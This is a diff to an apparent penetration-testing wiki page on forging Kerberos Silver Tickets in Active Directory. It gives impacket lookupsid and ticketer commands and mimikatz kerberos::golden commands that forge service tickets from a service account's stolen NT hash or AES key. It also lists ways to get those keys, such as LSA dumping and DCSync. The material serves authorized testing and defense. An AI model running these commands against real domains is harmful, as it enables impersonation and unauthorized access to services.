@@ -7,12 +7,12 @@ category: ad
 
 ## Theory
 
-The long-term key of a service account can be used to forge a Service ticket that can later be used with [Pass-the-ticket](../ptt.md) to access that service. In a Silver Ticket scenario, an attacker will forge a Service Ticket containing a PAC that features arbitrary information about the requesting user, effectively granting lots of access.
+The long-term key of a service account can be used to forge a Service ticket that can later be used with [Pass-the-ticket](../pass-the/ptt.md) to access that service. In a Silver Ticket scenario, an attacker will forge a Service Ticket containing a PAC that features arbitrary information about the requesting user, effectively granting lots of access.
 
 ## Practice
 
 > [!IMPORTANT]
-> When forging tickets, before November 2021 updates, the `user-id` and `groups-ids` were useful but the `username` supplied was mostly useless. As of Nov. 2021 updates, if the `username` supplied doesn't exist in Active Directory, the ticket gets rejected. This also applies to Silver Tickets.
+> When forging tickets, before November 2021 updates, the `user-id` and `groups-ids` were useful but the `username` supplied was mostly useless. As of Nov. 2021 updates, if the `username` supplied doesn't exist in Active Directory, the ticket gets rejected.
 
 In order to craft a silver ticket, testers need to find the target service account's RC4 key (i.e. NT hash) or AES key (128 or 256 bits). This can be done by [capturing an NTLM response](../../ntlm/capture.md) (preferably NTLMv1) and [cracking](../../credentials/cracking.md) it, by [dumping LSA secrets](../../credentials/dumping/sam-and-lsa-secrets.md), by doing a [DCSync](../../credentials/dumping/dcsync.md), etc.
 
@@ -26,13 +26,13 @@ The [Impacket](https://github.com/SecureAuthCorp/impacket) script [ticketer](htt
 
 ```bash
 # Find the domain SID
-lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0
+lookupsid.py -hashes "ffffffffffffffffffffffffffffffff:$NT_HASH" "$DOMAIN/$USER@$DC_HOST" 0
 
 # with an NT hash
-python ticketer.py -nthash "$NT_HASH" -domain-sid "$DomainSID" -domain "$DOMAIN" -spn "$SPN" "username"
+python ticketer.py -nthash "$NT_HASH" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" -spn "$SPN" "$USER"
 
 # with an AES (128 or 256 bits) key
-python ticketer.py -aesKey "$AESkey" -domain-sid "$DomainSID" -domain "$DOMAIN" -spn "$SPN" "username"
+python ticketer.py -aesKey "$AES_KEY" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" -spn "$SPN" "$USER"
 ```
 
 The SPN (ServicePrincipalName) set will have an impact on what services will be reachable. For instance, `cifs/target.domain` or `host/target.domain` will allow most remote dumping operations (more info on [adsecurity.org](https://adsecurity.org/?page_id=183)).
@@ -44,16 +44,16 @@ On Windows, [mimikatz](https://github.com/gentilkiwi/mimikatz) can be used to ge
 
 ```bash
 # with an NT hash
-kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$serviceAccount_NThash /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt
+kerberos::golden /domain:$DOMAIN /sid:$DOMAIN_SID /rc4:$serviceAccount_NThash /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt
 
 # with an AES 128 key
-kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$serviceAccount_aes128_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt
+kerberos::golden /domain:$DOMAIN /sid:$DOMAIN_SID /aes128:$serviceAccount_aes128_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt
 
 # with an AES 256 key
-kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$serviceAccount_aes256_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt
+kerberos::golden /domain:$DOMAIN /sid:$DOMAIN_SID /aes256:$serviceAccount_aes256_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt
 ```
 
-For both mimikatz and Rubeus, the `/ptt` flag is used to automatically [inject the ticket](../ptt.md#injecting-the-ticket).
+For both mimikatz and Rubeus, the `/ptt` flag is used to automatically [inject the ticket](../pass-the/ptt.md#injecting-the-ticket).
 
 :::
 
